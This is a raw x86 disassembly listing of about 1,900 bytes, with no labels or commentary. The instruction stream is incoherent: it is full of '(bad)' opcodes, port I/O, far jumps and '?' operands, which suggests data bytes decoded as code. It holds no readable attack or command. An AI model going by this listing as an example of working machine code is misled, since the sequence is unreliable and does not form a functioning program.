  419c57:	add    eax,0xe811d07b
  419c5c:	aas    
  419c5d:	enter  0x8a39,0x40
  419c61:	frstor [ebx+0x5e]
  419c64:	outs   dx,BYTE PTR ds:[esi]
  419c65:	sub    bl,ch
  419c67:	stos   BYTE PTR es:[edi],al
  419c68:	cdq    
  419c69:	adc    ebx,DWORD PTR [ecx+0x28e476d9]
  419c6f:	mov    ecx,0x427cd0bd
  419c74:	sub    BYTE PTR [esp+ecx*4],al
  419c77:	int    0xbb
  419c79:	push   ss
  419c7a:	push   esp
  419c7b:	add    DWORD PTR [eax],0x2d
  419c7e:	scas   eax,DWORD PTR es:[edi]
  419c7f:	das    
  419c80:	jnp    0x419c11
  419c82:	cmp    BYTE PTR [edi+0xd90e79b],al
  419c88:	sar    ebp,1
  419c8a:	sbb    eax,0x13496d7f
  419c8f:	or     al,cl
  419c91:	dec    ebp
  419c92:	cwde   
  419c93:	test   al,0xc8
  419c95:	mov    eax,ds:0x20bcaffe
  419c9a:	(bad)  
  419c9b:	fwait
  419c9c:	ins    BYTE PTR es:[edi],dx
  419c9d:	adc    DWORD PTR [edx+0xb],0x57
  419ca1:	mov    esi,0xc4e7ce60
  419ca6:	cs add esp,ebx
  419ca9:	jnp    0x419d1c
  419cab:	cmp    BYTE PTR [edi],ah
  419cad:	mov    edi,0x852cd64d
  419cb2:	push   ebx
  419cb3:	push   ebx
  419cb4:	cdq    
  419cb5:	icebp  
  419cb6:	push   esi
  419cb7:	test   DWORD PTR [esi-0x7b],eax
  419cba:	mov    ch,0x7b
  419cbc:	adc    DWORD PTR [ebx],eax
  419cbe:	mov    bl,0x32
  419cc0:	push   0xffffff80
  419cc2:	jg     0x419d12
  419cc4:	clc    
  419cc5:	jg     0x419c9c
  419cc7:	jmp    0x90f0bde6
  419ccc:	pop    ds
  419ccd:	aad    0xe2
  419ccf:	mov    esp,0xea9c29cc
  419cd4:	mov    ecx,0x45d9abf5
  419cd9:	cmp    BYTE PTR [edi-0x2d],ch
  419cdc:	inc    esp
  419cdd:	bound  eax,QWORD PTR [edx+0x14cb9d31]
  419ce3:	pusha  
  419ce4:	sub    edx,esp
  419ce6:	out    0xd6,al
  419ce8:	stc    
  419ce9:	xor    edi,esi
  419ceb:	add    al,BYTE PTR [esi+0xcc7a2b0]
  419cf1:	sbb    ecx,DWORD PTR [ebx]
  419cf3:	inc    ebp
  419cf4:	push   cs
  419cf5:	bound  esi,QWORD PTR [edx+0x6]
  419cf8:	dec    esi
  419cf9:	mov    edx,0xe31c69fe
  419cfe:	jo     0x419d6d
  419d00:	cmp    BYTE PTR [ecx+0x3e96ebe9],bl
  419d06:	cmp    ah,dl
  419d08:	rcr    DWORD PTR [eax],0xde
  419d0b:	mov    ds:0xcd3b09ca,eax
  419d10:	arpl   WORD PTR [ebp+0x4a],cx
  419d13:	in     eax,0x4b
  419d15:	push   ebx
  419d16:	push   ss
  419d17:	leave  
  419d18:	outs   dx,BYTE PTR ds:[esi]
  419d19:	inc    esp
  419d1a:	xor    DWORD PTR [esi],ebx
  419d1c:	jg     0x419d61
  419d1e:	xor    eax,0x7c719383
  419d23:	sub    ecx,DWORD PTR [ebx]
  419d25:	add    al,BYTE PTR [ebp-0x60]
  419d28:	dec    edi
  419d29:	add    ch,BYTE PTR [eax]
  419d2b:	out    0x8a,eax
  419d2d:	mov    ebp,0xe59c7ce
  419d32:	push   edx
  419d33:	mov    BYTE PTR [ecx-0x3c589bdc],ah
  419d39:	les    ebp,FWORD PTR [eax]
  419d3b:	je     0x419d4e
  419d3d:	or     eax,0xfe3c7291
  419d42:	lea    esp,[ebx+0x4a]
  419d45:	aad    0x9f
  419d47:	rol    DWORD PTR [edi+0x7855e90e],0xd6
  419d4e:	test   eax,0x5f3daa07
  419d53:	xchg   ebp,eax
  419d54:	push   ebp
  419d55:	aaa    
  419d56:	mov    esp,0x93fc86ce
  419d5b:	leave  
  419d5c:	sbb    dl,BYTE PTR ds:0xee75b0f7
  419d62:	imul   edx,DWORD PTR [edi-0x280d5389]
  419d69:	nop
  419d6a:	out    dx,al
  419d6b:	addr16 in eax,dx
  419d6d:	fs scas al,BYTE PTR es:[edi]
  419d6f:	or     edx,esp
  419d71:	push   ecx
  419d72:	xor    ecx,DWORD PTR [ecx+0x5e]
  419d75:	ds aas 
  419d77:	les    ebp,FWORD PTR [ebx+0x2a395c2]
  419d7d:	push   es
  419d7e:	in     al,dx
  419d7f:	push   edi
  419d80:	aas    
  419d81:	sahf   
  419d82:	push   esp
  419d83:	pop    edi
  419d84:	in     eax,dx
  419d85:	push   ebx
  419d86:	test   DWORD PTR [ecx],edi
  419d88:	pop    ds
  419d89:	adc    dl,ch
  419d8b:	retf   
  419d8c:	jae    0x419ddd
  419d8e:	mov    ah,0x32
  419d90:	jg     0x419d4b
  419d92:	(bad)  
  419d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d94:	jns    0x419d5b
  419d96:	rol    ebx,0x6d
  419d99:	icebp  
  419d9a:	jge    0x419da6
  419d9c:	lock add ch,BYTE PTR [eax]
  419d9f:	data16 sbb ah,dh
  419da2:	dec    edx
  419da3:	inc    ebx
  419da4:	jae    0x419dea
  419da6:	(bad)  
  419da7:	repz jecxz 0x419d5b
  419daa:	push   edi
  419dab:	in     eax,dx
  419dac:	inc    edx
  419dad:	or     bh,BYTE PTR [edi-0x56]
  419db0:	pop    eax
  419db1:	adc    al,0x33
  419db3:	jbe    0x419da4
  419db5:	cli    
  419db6:	inc    edi
  419db7:	(bad)  
  419db8:	and    DWORD PTR [ebp+0x35cd87d],esi
  419dbe:	pop    ds
  419dbf:	mov    ebx,0x246fe5a2
  419dc4:	bound  esi,QWORD PTR [edx]
  419dc6:	leave  
  419dc7:	out    0x90,al
  419dc9:	adc    eax,0x3500b306
  419dce:	mov    al,ds:0x4c3629a5
  419dd3:	push   edx
  419dd4:	xor    dh,al
  419dd6:	pop    edx
  419dd7:	pop    es
  419dd8:	dec    ecx
  419dda:	mov    eax,0xeff5552e
  419ddf:	and    al,0x60
  419de1:	jnp    0x419da1
  419de3:	out    0xcc,eax
  419de5:	(bad)  
  419de6:	mov    bl,0x83
  419de8:	repz and DWORD PTR [ebx+ecx*2-0x58],esp
  419ded:	push   cs
  419dee:	and    bl,dh
  419df0:	dec    esp
  419df1:	sbb    BYTE PTR [edi],cl
  419df3:	stos   DWORD PTR es:[edi],eax
  419df4:	sub    al,0xb7
  419df6:	nop
  419df7:	add    al,0xa6
  419df9:	into   
  419dfa:	fbld   TBYTE PTR [ebx]
  419dfc:	ss pop edi
  419dfe:	xor    DWORD PTR [ebx+0x4a575636],ecx
  419e04:	xchg   ebx,eax
  419e05:	mov    al,0x8b
  419e07:	mov    dh,0x69
  419e09:	dec    esp
  419e0a:	push   ecx
  419e0b:	(bad)  
  419e0c:	mov    ss,WORD PTR [edi]
  419e0e:	mov    eax,ds:0x67fe5cdf
  419e13:	xchg   ecx,eax
  419e14:	mov    DWORD PTR [esi+0x45],eax
  419e17:	mov    cl,0x1e
  419e19:	adc    BYTE PTR [edi+esi*2],al
  419e1c:	ret    0x2ecd
  419e1f:	inc    esp
  419e20:	adc    ah,BYTE PTR [edi-0x10]
  419e23:	inc    eax
  419e24:	sub    bh,dl
  419e26:	mov    esp,0x1def3d92
  419e2b:	lods   eax,DWORD PTR ds:[esi]
  419e2c:	outs   dx,DWORD PTR ds:[esi]
  419e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e2e:	mov    al,ds:0xa167142c
  419e33:	mov    ebp,0x24107fd3
  419e38:	jnp    0x419e36
  419e3a:	loopne 0x419e70
  419e3c:	adc    dl,al
  419e3e:	jno    0x419e8b
  419e40:	xlat   BYTE PTR ds:[ebx]
  419e41:	and    al,0x38
  419e43:	xchg   ecx,eax
  419e44:	jmp    0x8d9d7fda
  419e49:	dec    eax
  419e4a:	fstp   DWORD PTR [eax+0x13c24762]
  419e50:	xor    ah,cl
  419e52:	dec    ecx
  419e53:	or     ebp,DWORD PTR [edi+0x7b95b7fe]
  419e59:	hlt    
  419e5a:	scas   al,BYTE PTR es:[edi]
  419e5b:	cmp    al,0xed
  419e5d:	mov    dl,0x7f
  419e5f:	adc    bh,BYTE PTR [edx+0x14cfdd3]
  419e65:	mov    dh,0x1e
  419e67:	lods   eax,DWORD PTR ds:[esi]
  419e68:	inc    ebx
  419e69:	push   gs
  419e6b:	in     al,dx
  419e6c:	(bad)  
  419e6d:	mov    WORD PTR [ebx-0x7d],gs
  419e70:	ins    BYTE PTR es:[edi],dx
  419e71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e72:	xchg   esi,eax
  419e73:	inc    edi
  419e74:	fimul  DWORD PTR [edx-0x49]
  419e77:	dec    edx
  419e78:	je     0x419e1a
  419e7a:	in     al,dx
  419e7b:	jmp    0x18365498
  419e80:	scas   al,BYTE PTR es:[edi]
  419e81:	outs   dx,DWORD PTR ds:[esi]
  419e82:	pop    ss
  419e83:	pop    esp
  419e84:	out    0xcb,eax
  419e86:	es jmp 0x419f06
  419e89:	ja     0x419e74
  419e8b:	mov    bh,BYTE PTR [esi+0x2d18548e]
  419e91:	fmul   QWORD PTR [edx]
  419e93:	push   ecx
  419e94:	mov    ecx,0xfc5db59e
  419e99:	jmp    0x419ef0
  419e9b:	pop    ebx
  419e9c:	les    edx,FWORD PTR [esp+esi*8]
  419e9f:	sub    al,0xc3
  419ea1:	arpl   WORD PTR [eax],ax
  419ea3:	gs mov bh,0x3e
  419ea6:	inc    ecx
  419ea7:	and    DWORD PTR [ebp-0x7b],edx
  419eaa:	ret    
  419eab:	test   al,0xc1
  419ead:	fcom   DWORD PTR [ecx-0x6419970c]
  419eb3:	pxor   mm6,mm7
  419eb6:	sub    DWORD PTR [edx],edi
  419eb8:	loop   0x419e8a
  419eba:	push   0xb
  419ebc:	sub    DWORD PTR [eax],ebx
  419ebe:	mov    dl,0x56
  419ec0:	jne    0x419f1f
  419ec2:	in     eax,0x1a
  419ec4:	xchg   BYTE PTR ds:0x97869cd8,cl
  419eca:	xor    al,0xe0
  419ecc:	jmp    0xf99adddf
  419ed1:	and    DWORD PTR [edx-0x4f522013],ebp
  419ed7:	push   esi
  419ed8:	clc    
  419ed9:	push   cs
  419eda:	(bad)  
  419edb:	bound  ebp,QWORD PTR [eax+0x73]
  419ede:	and    bh,BYTE PTR [ebx+0x75]
  419ee1:	fmul   DWORD PTR [ecx]
  419ee3:	jb     0x419e9c
  419ee5:	or     ebp,DWORD PTR [edi+esi*4-0x5408dd94]
  419eec:	int    0x6c
  419eee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419eef:	sub    DWORD PTR [esi+esi*4-0x515ebcf0],edi
  419ef6:	(bad)  
  419ef7:	retf   0xa7ec
  419efa:	jmp    0x61e3:0x298d2b3f
  419f01:	push   ss
  419f02:	inc    eax
  419f03:	rcr    DWORD PTR [eax+0x29],cl
  419f06:	daa    
  419f07:	aam    0xf2
  419f09:	xchg   DWORD PTR [eax+0x68480b57],edx
  419f0f:	adc    BYTE PTR [ebp-0x4e13940e],dl
  419f15:	inc    esi
  419f16:	add    edi,eax
  419f18:	jge    0x419ec8
  419f1a:	ror    DWORD PTR [ecx+0x0],cl
  419f1d:	pushf  
  419f1e:	inc    eax
  419f1f:	(bad)  
  419f20:	fcomp  DWORD PTR [ecx+edx*8+0x45]
  419f24:	inc    esi
  419f25:	dec    edx
  419f26:	test   DWORD PTR [eax+ecx*8+0x7ed43e1b],esi
  419f2d:	out    0x3e,eax
  419f2f:	pop    edi
  419f30:	sahf   
  419f31:	lea    edi,[ecx+eax*1]
  419f34:	push   edx
  419f35:	das    
  419f36:	mov    edi,0x650c868
  419f3b:	mov    esp,0x1c1178a6
  419f40:	mov    BYTE PTR [edi],ch
  419f42:	mov    bh,0xf8
  419f44:	lea    esi,[ebx-0x7b]
  419f47:	add    esi,esi
  419f49:	je     0x419f99
  419f4b:	pop    ebx
  419f4c:	ins    DWORD PTR es:[edi],dx
  419f4d:	std    
  419f4e:	push   ds
  419f4f:	scas   eax,DWORD PTR es:[edi]
  419f50:	iret   
  419f51:	jecxz  0x419f52
  419f53:	loopne 0x419ef6
  419f55:	mov    bl,0xf4
  419f57:	fistp  DWORD PTR [esi-0x5dcd5743]
  419f5d:	xor    BYTE PTR ds:0x71a90326,ch
  419f63:	test   al,0x92
  419f65:	in     al,dx
  419f66:	(bad)  
  419f67:	mov    ch,0x1f
  419f69:	jp     0x419fc7
  419f6b:	xor    BYTE PTR [ebx-0x5c],ch
  419f6e:	aaa    
  419f6f:	jle    0x419f05
  419f71:	test   BYTE PTR [eax+eiz*2],0xf8
  419f75:	cmp    DWORD PTR [edx+ecx*4-0x71],0xaf57774f
  419f7d:	(bad)  
  419f7e:	mov    ebp,0xd1cbf174
  419f83:	outs   dx,BYTE PTR ds:[esi]
  419f84:	or     eax,0x3356ee7d
  419f89:	add    eax,0x13ba301c
  419f8e:	in     eax,dx
  419f8f:	shl    BYTE PTR [esi],cl
  419f91:	mov    cl,0x74
  419f93:	mov    ah,dh
  419f95:	xchg   edx,eax
  419f96:	dec    ebp
  419f97:	in     al,0x7b
  419f99:	out    0x4e,al
  419f9b:	int3   
  419f9c:	mov    ds:0xca3351f2,eax
  419fa1:	mov    bl,0xdc
  419fa3:	sub    BYTE PTR [edx-0x7749e450],ah
  419fa9:	pop    ds
  419faa:	dec    esi
  419fab:	xchg   edi,eax
  419fac:	fisub  DWORD PTR [ebx+0x33051e07]
  419fb2:	ss sbb esp,esp
  419fb5:	pop    ebx
  419fb6:	inc    edx
  419fb7:	(bad)  
  419fb8:	push   edx
  419fb9:	je     0x419fc2
  419fbb:	sbb    DWORD PTR [ebp+0x6ec71b2c],ecx
  419fc1:	cld    
  419fc2:	inc    ecx
  419fc3:	jne    0x419ff9
  419fc5:	ja     0x419ff9
  419fc7:	jp     0x419f4b
  419fc9:	adc    BYTE PTR [ebp+0x56],0x8b
  419fcd:	xor    esp,DWORD PTR [eax+0x3d]
  419fd0:	or     DWORD PTR [edi],esi
  419fd2:	hlt    
  419fd3:	adc    BYTE PTR [ecx+0x66],al
  419fd6:	mov    esi,0x7cb74f0d
  419fdb:	fisub  DWORD PTR [edi-0xe]
  419fde:	fbstp  TBYTE PTR [ebx]
  419fe0:	sub    edi,DWORD PTR [esi-0x1d]
  419fe3:	int3   
  419fe4:	jmp    0x9ec4:0xbcb7696f
  419feb:	out    0x1a,eax
  419fed:	sbb    eax,0x2a431b0d
  419ff2:	jp     0x41a014
  419ff4:	dec    edx
  419ff5:	xchg   esp,eax
  419ff6:	std    
  419ff7:	jb     0x419fee
  419ff9:	mov    ch,0xd4
  419ffb:	xchg   esp,eax
  419ffc:	jecxz  0x419fb9
  419ffe:	arpl   cx,bx
  41a000:	mov    edx,0x745e6531
  41a005:	shl    esi,cl
  41a007:	js     0x41a05d
  41a009:	mov    edx,0x15893018
  41a00e:	leave  
  41a00f:	into   
  41a010:	mov    eax,ds:0x7b18165d
  41a015:	lods   al,BYTE PTR ds:[esi]
  41a016:	sbb    eax,0xdddb25c6
  41a01b:	add    eax,0x7f59e19c
  41a020:	test   eax,0x2d7da090
  41a025:	int3   
  41a026:	aam    0x29
  41a028:	push   0x22
  41a02a:	and    eax,0x769fcb4
  41a02f:	das    
  41a030:	scas   al,BYTE PTR es:[edi]
  41a031:	call   0x86f4:0xb28234ab
  41a038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a039:	mov    ah,0x17
  41a03b:	(bad)
  41a03f:	xchg   edi,eax
  41a040:	jmp    0x374ac16a
  41a045:	enter  0x46db,0x1c
  41a049:	push   esp
  41a04a:	dec    ebx
  41a04b:	and    esi,DWORD PTR es:[esi+0x2d]
  41a04f:	es int3 
  41a051:	lock shl BYTE PTR [ebx-0x15291062],0x5b
  41a059:	into   
  41a05a:	mov    cl,0xf9
  41a05c:	pop    esi
  41a05d:	mov    ?,WORD PTR [ecx-0x1a]
  41a060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a061:	dec    eax
  41a062:	jns    0x41a00f
  41a064:	mov    al,ds:0xf613f2ca
  41a069:	or     al,0xa1
  41a06b:	xor    eax,0x727c0e7b
  41a070:	pop    ebp
  41a071:	xlat   BYTE PTR ds:[ebx]
  41a072:	cmc    
  41a073:	adc    eax,0x9c8b319c
  41a078:	mov    al,0x73
  41a07a:	lods   al,BYTE PTR ds:[esi]
  41a07b:	jne    0x41a098
  41a07d:	cmp    edx,ecx
  41a07f:	or     eax,0x6414cb3e
  41a084:	ins    BYTE PTR es:[edi],dx
  41a085:	es addr16 inc ebx
  41a088:	sub    dl,BYTE PTR cs:[eax+eax*2+0x7043499b]
  41a090:	sbb    BYTE PTR [esi+0x43],ah
  41a093:	cwde   
  41a094:	xor    edi,DWORD PTR ds:0x60d833c6
  41a09a:	mov    ebx,0xad53981
  41a09f:	ficomp DWORD PTR [edi]
  41a0a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0a2:	xchg   ecx,eax
  41a0a3:	addr16 es jo 0x41a11d
  41a0a7:	shl    BYTE PTR [esi-0x48],1
  41a0aa:	adc    eax,DWORD PTR [ebx-0x49f310e9]
  41a0b0:	(bad)  
  41a0b1:	push   edx
  41a0b2:	cld    
  41a0b3:	cli    
  41a0b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0b5:	push   0xffffffa3
  41a0b7:	je     0x41a0c7
  41a0b9:	jns    0x41a0a5
  41a0bb:	push   ebp
  41a0bc:	or     DWORD PTR [esi-0x77],ebx
  41a0bf:	mov    DWORD PTR [eax+esi*8+0x44dc6b31],ebx
  41a0c6:	adc    BYTE PTR [esi-0x713fff0d],al
  41a0cc:	jno    0x41a06c
  41a0ce:	clc    
  41a0cf:	gs test al,0x28
  41a0d2:	into   
  41a0d3:	and    DWORD PTR [esi],ebp
  41a0d5:	xchg   esi,eax
  41a0d6:	jl     0x41a103
  41a0d8:	je     0x41a144
  41a0da:	addr16 mov esp,0x71dacd82
  41a0e0:	mov    ebp,0x4e6b6306
  41a0e5:	stos   BYTE PTR es:[edi],al
  41a0e6:	es inc edx
  41a0e8:	test   al,0x18
  41a0ea:	dec    ecx
  41a0eb:	jae    0x41a0ba
  41a0ed:	cli    
  41a0ee:	lods   eax,DWORD PTR ds:[esi]
  41a0ef:	mov    edx,0x398126e1
  41a0f4:	mov    ecx,esp
  41a0f6:	fstp   QWORD PTR [edi-0x415b3175]
  41a0fc:	scas   al,BYTE PTR es:[edi]
  41a0fd:	xor    DWORD PTR [edi+0x43ded7f6],0xffffffee
  41a104:	adc    eax,0x2b78cf3
  41a109:	sbb    BYTE PTR [esp+ebp*8+0x2b],0xf9
  41a10e:	inc    esi
  41a10f:	inc    ebp
  41a110:	ds xchg edx,eax
  41a112:	ds jle 0x41a177
  41a115:	push   ss
  41a116:	mov    dh,0x60
  41a118:	lods   eax,DWORD PTR ds:[esi]
  41a119:	in     al,dx
  41a11a:	test   DWORD PTR [edx+0x1c5ac48a],0x7ea103c6
  41a124:	out    0x1f,eax
  41a126:	imul   ebx,esp,0xbdc0051b
  41a12c:	and    BYTE PTR [eax+eax*4],al
  41a12f:	in     eax,0xde
  41a131:	imul   ebx,DWORD PTR [esi],0x7f7d0aa9
  41a137:	push   edi
  41a138:	fbld   TBYTE PTR [edx+eiz*2+0x35f2fcbd]
  41a13f:	mov    gs,ebx
  41a141:	loopne 0x41a124
  41a143:	dec    edx
  41a144:	mov    bh,0x26
  41a146:	adc    ebx,DWORD PTR [edx-0xd]
  41a149:	cli    
  41a14a:	push   ecx
  41a14b:	mov    BYTE PTR [ebx-0x47baf845],bl
  41a151:	mov    edx,0xbf19fe68
  41a156:	jmp    FWORD PTR [edi]
  41a158:	push   eax
  41a159:	push   edi
  41a15a:	mov    ebp,0xac9474e4
  41a15f:	enter  0x4d5,0x71
  41a163:	push   0x93a890d1
  41a168:	outs   dx,DWORD PTR ds:[esi]
  41a169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a16a:	adc    BYTE PTR [eax+0x50f2e806],0x5b
  41a171:	add    ecx,esi
  41a173:	cmp    BYTE PTR [ecx+0x45],ah
  41a176:	or     eax,0x84af951d
  41a17b:	scas   al,BYTE PTR es:[edi]
  41a17c:	bound  eax,QWORD PTR [esi]
  41a17e:	test   DWORD PTR [ecx-0x382d61c3],eax
  41a184:	loop   0x41a18a
  41a186:	sub    ebx,ebp
  41a188:	test   DWORD PTR [ecx],esi
  41a18a:	ja     0x41a156
  41a18c:	pop    esp
  41a18d:	sahf   
  41a18e:	push   ecx
  41a18f:	add    al,BYTE PTR [edx-0x72c22073]
  41a195:	dec    eax
  41a196:	xchg   edx,eax
  41a197:	fwait
  41a198:	js     0x41a200
  41a19a:	or     al,BYTE PTR [edx]
  41a19c:	sub    eax,0x98cd4de1
  41a1a1:	js     0x41a203
  41a1a3:	scas   eax,DWORD PTR es:[edi]
  41a1a4:	xor    bl,al
  41a1a6:	jge    0x41a180
  41a1a8:	popa   
  41a1a9:	lods   al,BYTE PTR ds:[esi]
  41a1aa:	cmp    eax,0x107860ef
  41a1af:	popa   
  41a1b0:	rcl    BYTE PTR ds:0x34f60b39,cl
  41a1b6:	pop    ebx
  41a1b7:	das    
  41a1b8:	mov    ch,0xcb
  41a1ba:	dec    ecx
  41a1bb:	aad    0x33
  41a1bd:	push   ecx
  41a1be:	xchg   esp,eax
  41a1bf:	cld    
  41a1c0:	pop    edx
  41a1c1:	mov    al,0xb9
  41a1c3:	xor    al,0x78
  41a1c5:	fild   QWORD PTR [edi]
  41a1c7:	aas    
  41a1c8:	xchg   ecx,eax
  41a1c9:	push   esi
  41a1ca:	and    bl,BYTE PTR [edx]
  41a1cc:	je     0x41a158
  41a1ce:	jo     0x41a23a
  41a1d0:	aaa    
  41a1d1:	sbb    ah,dh
  41a1d3:	in     al,dx
  41a1d4:	xchg   edx,eax
  41a1d5:	sbb    eax,0xbf70d45e
  41a1da:	pop    ss
  41a1db:	popf   
  41a1dc:	xor    bh,BYTE PTR [eax+eiz*2-0x41]
  41a1e0:	jp     0x41a1fd
  41a1e2:	test   al,0x17
  41a1e4:	xor    eax,0x58c3c52a
  41a1e9:	dec    ecx
  41a1ea:	ss push esp
  41a1ec:	or     BYTE PTR [ebp+0xb],dl
  41a1ef:	nop
  41a1f0:	push   es
  41a1f1:	iret   
  41a1f2:	adc    al,0x9
  41a1f4:	aas    
  41a1f5:	sti    
  41a1f6:	xchg   esi,eax
  41a1f7:	mov    ebx,0x398da647
  41a1fc:	xor    ah,BYTE PTR [ecx-0x11]
  41a1ff:	into   
  41a200:	dec    edi
  41a201:	sub    DWORD PTR [esi+0x6a],edi
  41a204:	xchg   esi,ebx
  41a206:	leave  
  41a207:	lea    edi,[ecx]
  41a209:	in     eax,0x2a
  41a20b:	mov    edx,0xa9458ae7
  41a210:	xor    al,0xa4
  41a212:	mov    ah,0xbf
  41a214:	xchg   esi,eax
  41a215:	out    dx,al
  41a216:	cli    
  41a217:	cmp    al,BYTE PTR [ecx-0x3]
  41a21a:	mov    eax,cs:0x442ba38b
  41a220:	or     BYTE PTR [esi],al
  41a222:	dec    eax
  41a223:	scas   al,BYTE PTR es:[edi]
  41a224:	pop    ds
  41a225:	dec    esi
  41a226:	fsub   QWORD PTR [edi+0x55629bd2]
  41a22c:	jle    0x41a216
  41a22e:	xor    DWORD PTR [esi+edi*1-0x6c],0xd
  41a233:	int    0xe2
  41a235:	imul   eax,DWORD PTR [edx],0xffffffa4
  41a238:	fimul  WORD PTR [ecx-0x3f5a1b96]
  41a23e:	aaa    
  41a23f:	leave  
  41a240:	xchg   esi,eax
  41a241:	rcl    BYTE PTR [ebx+0x2e],1
  41a244:	mov    ebx,0xd7443f64
  41a249:	mov    edx,0xd627a051
  41a24e:	jns    0x41a1de
  41a250:	push   cs
  41a251:	out    0xe8,al
  41a253:	mov    edx,DWORD PTR [eax]
  41a255:	jge    0x41a205
  41a257:	jbe    0x41a219
  41a259:	adc    BYTE PTR ds:0xc1d1dfcc,bh
  41a25f:	pusha  
  41a260:	ret    0x75b
  41a263:	adc    ch,BYTE PTR [edx]
  41a265:	sbb    esi,DWORD PTR [esi]
  41a267:	mov    al,ds:0x98984508
  41a26c:	sub    dh,BYTE PTR [ebp+0x4]
  41a26f:	sbb    ebp,esp
  41a271:	cld    
  41a272:	push   ebx
  41a273:	xlat   BYTE PTR ds:[ebx]
  41a274:	push   ecx
  41a275:	pop    esi
  41a276:	mov    WORD PTR [ebp+0x243c71fc],?
  41a27c:	aad    0x5b
  41a27e:	cmp    cl,al
  41a280:	inc    ebp
  41a281:	sub    BYTE PTR [edi-0x6],bh
  41a284:	mov    ebx,DWORD PTR [ebx-0x1a7d46b8]
  41a28a:	cmp    eax,0x8c9724fd
  41a28f:	nop
  41a290:	lods   al,BYTE PTR ds:[esi]
  41a291:	leave  
  41a292:	and    BYTE PTR [eax-0x42ef3f42],0xf1
  41a299:	mov    WORD PTR [ebp+edi*4+0x17a8845d],?
  41a2a0:	sbb    al,0x9f
  41a2a2:	or     DWORD PTR [ecx+0x20],ecx
  41a2a5:	sbb    BYTE PTR [edi*1-0x18b8fc18],ah
  41a2ac:	sbb    edi,ebp
  41a2ae:	iret   
  41a2af:	mov    al,0x18
  41a2b1:	in     eax,0x8c
  41a2b3:	xchg   esp,eax
  41a2b4:	xchg   ebx,eax
  41a2b5:	enter  0xe9cb,0x0
  41a2b9:	pop    ss
  41a2ba:	ret    
  41a2bb:	test   DWORD PTR [ebx-0x20],ebx
  41a2be:	push   esp
  41a2bf:	push   cs
  41a2c0:	aad    0x14
  41a2c2:	fsubrp st(7),st
  41a2c4:	jp     0x41a344
  41a2c6:	popa   
  41a2c7:	mov    al,ds:0x50bd4212
  41a2cc:	or     BYTE PTR ds:0x71f26642,dh
  41a2d2:	inc    ebp
  41a2d3:	sub    al,0x3a
  41a2d5:	mov    BYTE PTR [ebx-0x63673ef2],0x35
  41a2dc:	bound  ebp,QWORD PTR [esi-0x28]
  41a2df:	(bad)  [ebp-0x1e7b96f4]
  41a2e5:	out    dx,eax
  41a2e6:	and    cl,bh
  41a2e8:	(bad)  
  41a2ea:	mov    ebx,0x64c05023
  41a2ef:	sub    ecx,DWORD PTR [edi+0x23]
  41a2f2:	pop    ebx
  41a2f3:	or     bl,dl
  41a2f5:	(bad)  
  41a2f7:	int    0xe7
  41a2f9:	cmp    DWORD PTR [edi],esp
  41a2fb:	or     bl,BYTE PTR [esi+0x14]
  41a2fe:	gs jae 0x41a37a
  41a301:	cmp    BYTE PTR [ebx+edx*2+0x4508ffab],bh
  41a308:	sub    al,0x4c
  41a30a:	jns    0x41a369
  41a30c:	pop    eax
  41a30d:	aas    
  41a30e:	jmp    0x9786e114
  41a313:	mov    BYTE PTR [edx-0x5d],cl
  41a316:	pushf  
  41a317:	xor    edx,DWORD PTR ds:0xc0a716a2
  41a31d:	fdivr  DWORD PTR [esi-0x7]
  41a320:	inc    esi
  41a321:	jecxz  0x41a351
  41a323:	lahf   
  41a324:	push   eax
  41a325:	js     0x41a360
  41a327:	call   0xd3e2c4a8
  41a32c:	arpl   WORD PTR [eax-0x5a6e5ecb],dx
  41a332:	adc    esp,0x53
  41a335:	sub    eax,0x4bb0890b
  41a33a:	in     al,0x15
  41a33c:	out    dx,al
  41a33d:	pop    eax
  41a33e:	outs   dx,BYTE PTR ds:[esi]
  41a33f:	xor    BYTE PTR [edx-0x4e],bl
  41a342:	pop    ebp
  41a343:	adc    bl,BYTE PTR [edi+0x72]
  41a346:	hlt    
  41a347:	popf   
  41a348:	jno    0x41a2da
  41a34a:	xchg   edx,eax
  41a34b:	mov    ch,0x5
  41a34d:	xor    eax,0x951d2858
  41a352:	cmp    al,0x37
  41a354:	shl    DWORD PTR [edx+0x754dc9ad],0x2e
  41a35b:	xchg   esi,eax
  41a35c:	adc    eax,0x736268ec
  41a361:	test   DWORD PTR [ebp+0x4a235632],ebx
  41a367:	cmc    
  41a368:	cli    
  41a369:	in     eax,0x88
  41a36b:	mov    edi,0x8e79cca4
  41a370:	push   ebx
  41a371:	ss mov dh,0xb2
  41a374:	and    DWORD PTR [edx+esi*1],edi
  41a377:	test   BYTE PTR [ecx],bl
  41a379:	jne    0x41a3a0
  41a37b:	enter  0xdd47,0xcd
  41a37f:	repnz ins BYTE PTR es:[edi],dx
  41a381:	ins    DWORD PTR es:[edi],dx
  41a382:	lods   eax,DWORD PTR ds:[esi]
  41a383:	repnz xchg esp,eax
  41a385:	es inc edx
  41a387:	mov    eax,ds:0x1a56d347
  41a38c:	sbb    DWORD PTR [esi-0x48d3b04c],edx
  41a392:	adc    DWORD PTR [esi-0x1b],0x69060803
  41a399:	les    esp,FWORD PTR [ebx-0x4880be16]
  41a39f:	pop    esi
  41a3a0:	jnp    0x41a40a
  41a3a2:	pop    edx
  41a3a3:	sbb    edx,eax
  41a3a5:	arpl   WORD PTR [ebp+0x1108783c],dx
  41a3ab:	xor    DWORD PTR [edx+0x4232ade3],ecx
  41a3b1:	inc    edx
  41a3b2:	xchg   ebx,eax
  41a3b3:	cmp    al,0xdd
  41a3b5:	add    bl,BYTE PTR [ebx+0x6f]
  41a3b8:	ins    DWORD PTR es:[edi],dx
  41a3b9:	jge    0x41a3cd
  41a3bb:	sbb    BYTE PTR [esi],0xc4
  41a3be:	stos   BYTE PTR es:[edi],al
  41a3bf:	or     al,0xc3
  41a3c1:	out    dx,al
  41a3c2:	and    BYTE PTR [esi+0x6c],ch
  41a3c5:	xlat   BYTE PTR ds:[ebx]
  41a3c6:	frstor [esi+0x44]
